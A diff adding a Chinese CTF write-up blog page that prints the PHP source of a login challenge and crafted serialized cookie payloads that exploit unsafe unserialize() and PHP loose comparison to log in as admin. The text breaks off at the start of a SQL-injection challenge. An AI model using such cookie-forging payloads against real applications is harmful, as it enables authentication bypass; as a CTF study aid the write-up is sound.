@@ -1,0 +1,676 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>ctftime | upload</title><meta name="keywords" content="xss盗取cookie,sqllite注入 orderby注入,nosql注入,AST 注入,LFI+RCE+session"><meta name="author" content="upload"><meta name="copyright" content="upload"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="GOGOGGOGOGGOGO">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctftime">
+<meta property="og:url" content="http://upload.love/2021/04/24/ctftime-1/index.html">
+<meta property="og:site_name" content="upload">
+<meta property="og:description" content="GOGOGGOGOGGOGO">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://upload.love/image/ctftime.jpg">
+<meta property="article:published_time" content="2021-04-24T03:10:27.000Z">
+<meta property="article:modified_time" content="2021-08-23T13:37:16.000Z">
+<meta property="article:author" content="upload">
+<meta property="article:tag" content="xss盗取cookie">
+<meta property="article:tag" content="sqllite注入 orderby注入">
+<meta property="article:tag" content="nosql注入">
+<meta property="article:tag" content="AST 注入">
+<meta property="article:tag" content="LFI+RCE+session">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://upload.love/image/ctftime.jpg"><link rel="shortcut icon" href="/%E7%94%B7%E5%AD%A9.png"><link rel="canonical" href="http://upload.love/2021/04/24/ctftime-1/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}
+
+// https://stackoverflow.com/questions/16839698/jquery-getscript-alternative-in-native-javascript
+const getScript = url => new Promise((resolve, reject) => {
+  const script = document.createElement('script')
+  script.src = url
+  script.async = true
+  script.onerror = reject
+  script.onload = script.onreadystatechange = function() {
+    const loadState = this.readyState
+    if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+    script.onload = script.onreadystatechange = null
+    resolve()
+  }
+  document.head.appendChild(script)
+})</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-08-23 21:37:16'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'true'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><link rel="stylesheet" href="/css/background.css"><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="upload" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" data-lazy-src="/image/pp.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">196</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">136</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">17</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> ♥♥♥</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/2.jpgs)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">upload</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> ♥♥♥</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ctftime</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-04-24T03:10:27.000Z" title="发表于 2021-04-24 11:10:27">2021-04-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-08-23T13:37:16.000Z" title="更新于 2021-08-23 21:37:16">2021-08-23</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctftime/">ctftime</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">6.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>40分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Usual-or-Unusual"><a href="#Usual-or-Unusual" class="headerlink" title="Usual or Unusual"></a>Usual or Unusual</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//ini_set(&quot;display_errors&quot;, 1);</span></span><br><span class="line"><span class="comment">//error_reporting(0);</span></span><br><span class="line">$seed = file_get_contents(<span class="string">&quot;seed&quot;</span>);</span><br><span class="line">$flag = file_get_contents(<span class="string">&quot;flag&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $id;</span><br><span class="line">    <span class="keyword">private</span> $username;</span><br><span class="line">    <span class="keyword">private</span> $password;</span><br><span class="line">    <span class="keyword">private</span> $showSource;</span><br><span class="line">    <span class="keyword">private</span> $color;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$id</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id = $id;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&quot;guest&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="string">&quot;guest&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;showSource = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;color = <span class="string">&quot;#FFFFFF&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getUsername</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setUsername</span>(<span class="params">$username</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPassword</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setPassword</span>(<span class="params">$password</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getShowSource</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;showSource;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setShowSource</span>(<span class="params">$showSource</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;showSource = $showSource;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getColor</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;color;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setColor</span>(<span class="params">$color</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;color = $color;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$userColor = <span class="string">&quot;#FFFFFF&quot;</span>;</span><br><span class="line">$result = <span class="string">&quot;Login Failed&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&quot;login&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">&quot;cookie&quot;</span>]))&#123;</span><br><span class="line">        $user = unserialize($_COOKIE[<span class="string">&quot;cookie&quot;</span>]);</span><br><span class="line">        $user-&gt;setUsername($_POST[<span class="string">&quot;username&quot;</span>]);</span><br><span class="line">        $user-&gt;setPassword($_POST[<span class="string">&quot;password&quot;</span>]);</span><br><span class="line">        setcookie(<span class="string">&quot;cookie&quot;</span>, serialize($user), [</span><br><span class="line">            <span class="string">&quot;expires&quot;</span>=&gt;time() + (<span class="number">86400</span> * <span class="number">30</span>),</span><br><span class="line">            <span class="string">&quot;path&quot;</span>=&gt;<span class="string">&quot;/&quot;</span>,</span><br><span class="line">            <span class="string">&quot;httponly&quot;</span>=&gt;<span class="literal">true</span>,</span><br><span class="line">            <span class="string">&quot;samesite&quot;</span>=&gt;<span class="string">&quot;Strict&quot;</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">&quot;cookie&quot;</span>]))&#123;</span><br><span class="line">    $user = unserialize($_COOKIE[<span class="string">&quot;cookie&quot;</span>]);</span><br><span class="line">    <span class="keyword">if</span>($user-&gt;getShowSource())&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $userColor = $user-&gt;getColor();</span><br><span class="line">        gmp_random_seed($seed);</span><br><span class="line">        $rand = gmp_random_bits(<span class="number">100</span>);</span><br><span class="line">        $password = $flag . gmp_strval($rand);</span><br><span class="line">        <span class="keyword">if</span>($user-&gt;getUsername() == <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>($user-&gt;getPassword() == $password)&#123;</span><br><span class="line">                $result = $flag;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $rand = gmp_random_bits(<span class="number">100</span>);</span><br><span class="line">    $user = <span class="keyword">new</span> User(gmp_strval($rand));</span><br><span class="line">    setcookie(<span class="string">&quot;cookie&quot;</span>, serialize($user), [</span><br><span class="line">        <span class="string">&quot;expires&quot;</span>=&gt;time() + (<span class="number">86400</span> * <span class="number">30</span>),</span><br><span class="line">        <span class="string">&quot;path&quot;</span>=&gt;<span class="string">&quot;/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;httponly&quot;</span>=&gt;<span class="literal">true</span>,</span><br><span class="line">        <span class="string">&quot;samesite&quot;</span>=&gt;<span class="string">&quot;Strict&quot;</span></span><br><span class="line">    ]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&#x27;en&#x27;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Login Page&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&#x27;UTF-8&#x27;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&#x27;viewport&#x27; content=&#x27;width=device-width, initial-scale=1&#x27;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&#x27;icon&#x27; type=&#x27;image/png&#x27; href=&#x27;images/icons/favicon.ico&#x27;/&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&#x27;stylesheet&#x27; type=&#x27;text/css&#x27; href=&#x27;vendor/bootstrap/css/bootstrap.min.css&#x27;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&#x27;stylesheet&#x27; type=&#x27;text/css&#x27; href=&#x27;fonts/font-awesome-4.7.0/css/font-awesome.min.css&#x27;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&#x27;stylesheet&#x27; type=&#x27;text/css&#x27; href=&#x27;vendor/animate/animate.css&#x27;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&#x27;stylesheet&#x27; type=&#x27;text/css&#x27; href=&#x27;vendor/css-hamburgers/hamburgers.min.css&#x27;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&#x27;stylesheet&#x27; type=&#x27;text/css&#x27; href=&#x27;vendor/select2/select2.min.css&#x27;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&#x27;stylesheet&#x27; type=&#x27;text/css&#x27; href=&#x27;css/util.css&#x27;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&#x27;stylesheet&#x27; type=&#x27;text/css&#x27; href=&#x27;css/main.css&#x27;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&#x27;bg-contact2&#x27;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&#x27;container-contact2&#x27;&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&#x27;wrap-contact2&#x27; style=\&quot;background: &quot;</span> . $userColor . <span class="string">&quot;;\&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;form method=&#x27;POST&#x27; enctype=&#x27;multipart/form-data&#x27; class=&#x27;contact2-form validate-form&#x27;&gt;</span></span><br><span class="line"><span class="string">                    &lt;span class=&#x27;contact2-form-title&#x27; style=&#x27;padding-bottom: 5%;&#x27;&gt;</span></span><br><span class="line"><span class="string">                        Login</span></span><br><span class="line"><span class="string">                    &lt;/span&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                    &lt;div class=&#x27;wrap-input2 validate-input&#x27; data-validate=&#x27;Username is required&#x27;&gt;</span></span><br><span class="line"><span class="string">                        &lt;input class=&#x27;input2&#x27; type=&#x27;text&#x27; name=&#x27;username&#x27;&gt;</span></span><br><span class="line"><span class="string">                        &lt;span class=&#x27;focus-input2&#x27; data-placeholder=&#x27;USERNAME&#x27;&gt;&lt;/span&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                    &lt;div class=&#x27;wrap-input2 validate-input&#x27; data-validate = &#x27;Password is required&#x27;&gt;</span></span><br><span class="line"><span class="string">                        &lt;input class=&#x27;input2&#x27; type=&#x27;password&#x27; name=&#x27;password&#x27;&gt;</span></span><br><span class="line"><span class="string">                        &lt;span class=&#x27;focus-input2&#x27; data-placeholder=&#x27;PASSWORD&#x27;&gt;&lt;/span&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">                    &lt;div class=&#x27;container-contact2-form-btn&#x27;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&#x27;wrap-contact2-form-btn&#x27;&gt;</span></span><br><span class="line"><span class="string">                            &lt;input type=&#x27;submit&#x27; name=&#x27;login&#x27; value=&#x27;Login&#x27; class=&#x27;contact2-form-btn&#x27;&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/form&gt;&lt;br&gt;&quot;</span></span><br><span class="line">                . $result . </span><br><span class="line">            <span class="string">&quot;&lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;script src=&#x27;vendor/jquery/jquery-3.2.1.min.js&#x27;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;script src=&#x27;vendor/bootstrap/js/popper.js&#x27;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;script src=&#x27;vendor/bootstrap/js/bootstrap.min.js&#x27;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;script src=&#x27;vendor/select2/select2.min.js&#x27;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;script src=&#x27;js/main.js&#x27;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">      window.dataLayer = window.dataLayer || [];</span></span><br><span class="line"><span class="string">      function gtag()&#123;dataLayer.push(arguments);&#125;</span></span><br><span class="line"><span class="string">      gtag(&#x27;js&#x27;, new Date());</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      gtag(&#x27;config&#x27;, &#x27;UA-23581568-13&#x27;);</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>反序列化在cookie里！</p>
+<p><code>PAYLOAD</code></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($user-&gt;getUsername() == <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>($user-&gt;getPassword() == $password)&#123;</span><br><span class="line">        $result = $flag;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;User&quot;:5:&#123;s:8:&quot;.User.id&quot;;s:31:&quot;1196235244507923447201774248406&quot;;s:14:&quot;.User.username&quot;;s:5:&quot;guest&quot;;s:14:&quot;.User.password&quot;;s:5:&quot;guest&quot;;s:16:&quot;.User.showSource&quot;;b:0;s:11:&quot;.User.color&quot;;s:7:&quot;#FFFFFF&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;User&quot;:5:&#123;s:8:&quot;.User.id&quot;;s:31:&quot;1196235244507923447201774248406&quot;;s:14:&quot;.User.username&quot;;s:5:&quot;admin&quot;;s:14:&quot;.User.password&quot;;b:1;s:16:&quot;.User.showSource&quot;;b:0;s:11:&quot;.User.color&quot;;s:7:&quot;#FFFFFF&quot;;&#125;</span><br><span class="line"></span><br><span class="line">.是%00   可能是因为网页解密的问题！ </span><br><span class="line">O%3A4%3A%22User%22%3A5%3A%7Bs%3A8%3A%22%00User%00id%22%3Bs%3A30%3A%22206922801991758349534736508434%22%3Bs%3A14%3A%22%00User%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00User%00password%22%3Bb%3A1%3Bs%3A16%3A%22%00User%00showSource%22%3Bb%3A0%3Bs%3A11%3A%22%00User%00color%22%3Bs%3A7%3A%22%23FFFF00%22%3B%7D</span><br><span class="line"></span><br><span class="line">O%3A4%3A%22User%22%3A5%3A%7Bs%3A8%3A%22%00User%00id%22%3Bs%3A30%3A%22206922801991758349534736508434%22%3Bs%3A14%3A%22%00User%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00User%00password%22%3Bb%3A0%3Bs%3A16%3A%22%00User%00showSource%22%3Bb%3A0%3Bs%3A11%3A%22%00User%00color%22%3Bs%3A7%3A%22%23FFFF00%22%3B%7D</span><br></pre></td></tr></table></figure>
+
+<p>为啥要把密码变成二进制呢！ </p>
+<p>个人感觉！ <code>010101 == &#39;aaaaa&#39;</code></p>
+<p>弱比较的化 字符串是 0 ！ 就是一个<code>php</code>弱比较！      </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">5</span>: &#123;</span><br><span class="line">    s:<span class="number">8</span>:<span class="string">&quot;.User.id&quot;</span>;</span><br><span class="line">    s:<span class="number">30</span>:<span class="string">&quot;890143755983288300723865605783&quot;</span>;</span><br><span class="line">    s:<span class="number">14</span>:<span class="string">&quot;.User.username&quot;</span>;</span><br><span class="line">    s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    s:<span class="number">14</span>:<span class="string">&quot;.User.password&quot;</span>;</span><br><span class="line">    i:<span class="number">0</span>;</span><br><span class="line">    s:<span class="number">16</span>:<span class="string">&quot;.User.showSource&quot;</span>;</span><br><span class="line">    b:<span class="number">0</span>;</span><br><span class="line">    s:<span class="number">11</span>:<span class="string">&quot;.User.color&quot;</span>;</span><br><span class="line">    s:<span class="number">7</span>:<span class="string">&quot;#FFFFFF&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">用二进制的化 b:<span class="number">1</span>;  为什么呢！ 因为是<span class="number">1</span> ！ 所以二进制里 是 <span class="number">2</span>的<span class="number">0</span>次方！ 反正二进制 必须是<span class="number">1</span>才行！ </span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="PwnQL-1"><a href="#PwnQL-1" class="headerlink" title="PwnQL #1"></a>PwnQL #1</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="keyword">__DIR__</span>  . <span class="string">&quot;/config.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    $username = $_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    $password = $_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    $sql = <span class="string">&quot;SELECT * FROM users WHERE username = :username AND password LIKE :password;&quot;</span>;</span><br><span class="line">    $sth = $db-&gt;prepare($sql, <span class="keyword">array</span>(PDO::ATTR_CURSOR =&gt; 